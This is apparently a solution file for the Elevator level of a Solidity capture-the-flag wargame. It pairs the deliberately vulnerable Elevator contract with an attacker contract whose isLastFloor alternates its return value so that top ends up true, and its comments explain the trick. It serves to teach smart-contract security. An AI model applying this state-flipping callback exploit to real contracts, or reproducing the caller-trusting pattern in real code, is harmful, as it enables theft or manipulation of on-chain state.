// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface Building {
  function isLastFloor(uint) external returns (bool);
}
// You can use the `view` function modifier on an interface in order to prevent state modifications. The `pure` modifier also prevents functions from modifying the state. Make sure you read Solidity's documentation and learn its caveats.

// An alternative way to solve this level is to build a `view` function which returns different results depends on input data but don't modify state, e.g. gasleft().

contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}

contract VirtualOverride {
    bool public isLast = true;

    function virtualOverride(address _addr) public {
        Elevator elevator = Elevator(_addr);
        elevator.goTo(20);
    }

    // It will be ran 1st on if validation, so it goes from true to false
    // Runs second time to validate top and goes from false to true
    // floor uint is just a distraction
    function isLastFloor(uint) external returns (bool) {
        isLast = !isLast;
        return isLast;
    }
}